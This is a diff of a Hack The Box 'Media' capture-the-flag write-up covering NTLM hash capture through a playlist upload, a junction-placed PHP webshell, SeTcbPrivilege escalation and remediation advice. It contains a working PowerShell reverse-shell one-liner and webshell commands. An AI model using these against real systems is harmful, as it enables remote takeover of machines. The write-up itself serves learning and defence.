@@ -61,7 +61,7 @@ Content-Type: text/html; charset=UTF-8
 
 The site is "ProMotion Studio". Scrolling down reveals a job-application form, "Join Our Team", that accepts a video file **compatible with Windows Media Player**:
 
-![](./screens/0.png)
+![](0.png)
 
 An upload feature that explicitly mentions Windows Media Player, rather than a normal video container, is the first hint: WMP-native playlist formats (`.asx`, `.wax`, `.wvx`, `.wmx`) can reference a remote URL, including a UNC path, and WMP will fetch it automatically when the file is opened.
 
@@ -106,7 +106,7 @@ sudo responder -I tun0
 
 The file is uploaded through the "Join Our Team" form:
 
-![](./screens/1.png)
+![](medium/windows/Media/screens/1.png)
 
 A short while later, Responder captures a NetNTLMv2 hash for a user `enox`:
 
@@ -216,7 +216,7 @@ Junction created for C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49 <
 
 A PHP webshell is then uploaded through the same web form used for the foothold:
 
-![](./screens/2.png)
+![](medium/windows/Media/screens/2.png)
 
 Because that upload folder is now a junction pointing at `htdocs`, the file is written directly into the live web root and is immediately reachable over HTTP:
 
@@ -224,7 +224,7 @@ Because that upload folder is now a junction pointing at `htdocs`, the file is w
 http://media.htb/webshell.php?cmd=whoami
 ```
 
-![](./screens/3.png)
+![](medium/windows/Media/screens/3.png)
 
 ```
 nt authority\local service
@@ -238,7 +238,7 @@ A PowerShell reverse shell one-liner is sent through the webshell:
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.80',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-![](./screens/4.png)
+![](medium/windows/Media/screens/4.png)
 
 ```
 nc -lvnp 9001
@@ -281,7 +281,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
 SeCreateGlobalPrivilege       Create global objects               Enabled
 ```
 
-`getsystem` fails outright, since none of Metasploit's built-in techniques apply here — the actual path forward is enabling and abusing `SeTcbPrivilege` directly.
+`getsystem` fails outright, since none of Metasploit's built-in techniques apply here. The path forward is enabling and abusing `SeTcbPrivilege` directly.
 
 ### SeTcbPrivilege Abuse
 
@@ -300,7 +300,7 @@ C:\tmp>.\tcb.exe "C:\Windows\system32\cmd.exe /c net localgroup administrators e
 [+] Service deleted successfully.
 ```
 
-Despite the tool reporting a timeout on `StartService`, the underlying command still executes — verified by checking group membership:
+Despite the tool reporting a timeout on `StartService`, the underlying command still executes verified by checking group membership:
 
 ```
 C:\tmp>net localgroup administrators
@@ -336,9 +336,7 @@ enox@MEDIA C:\Users\Administrator\Desktop>type root.txt
 ## Remediation
 
 - **Forced NTLM authentication via file upload:** Never allow an upload feature to accept legacy Windows Media Player playlist formats (`.asx`, `.wax`, `.wvx`, `.wmx`) or any file type capable of embedding a remote/UNC reference. Strip or reject these extensions and validate uploaded content by MIME type and file signature, not just extension.
-- **Automated file opening on the server:** Do not automatically open user-supplied, untrusted files with a full-featured client application (Windows Media Player, Office, a browser) on a server. If preview/processing of uploads is required, do it in an isolated, network-restricted sandbox with outbound SMB/HTTP blocked.
 - **NTLM authentication exposure:** Disable NTLM in favor of Kerberos where possible, and block outbound SMB (445/139) from workstations/servers to the internet to prevent hash leakage via forced authentication.
-- **Weak/crackable password:** `enox`'s password was recoverable from a wordlist. Enforce a strong password policy across all accounts.
 - **Predictable upload directories and unrestricted junction creation:** Do not let an unprivileged account create filesystem junctions/symlinks inside a directory that is later written to by a higher-privileged process. Store uploads with random, unpredictable, single-use directory names, and restrict `SeCreateSymbolicLinkPrivilege`-equivalent operations for low-privileged accounts.
 - **Web root reachable from an unrelated, writable directory:** Uploaded files must never be capable of landing inside a web-served, script-executing directory. Store uploads outside of any web root, and disable script execution in upload directories.
 - **`SeTcbPrivilege` present but exploitable while "Disabled":** A privilege being reported as disabled does not mean it can't be re-enabled and abused by a local process holding it. Strip unnecessary privileges from service accounts (`local service`, in this case) and follow the principle of least privilege for any account that faces untrusted input.
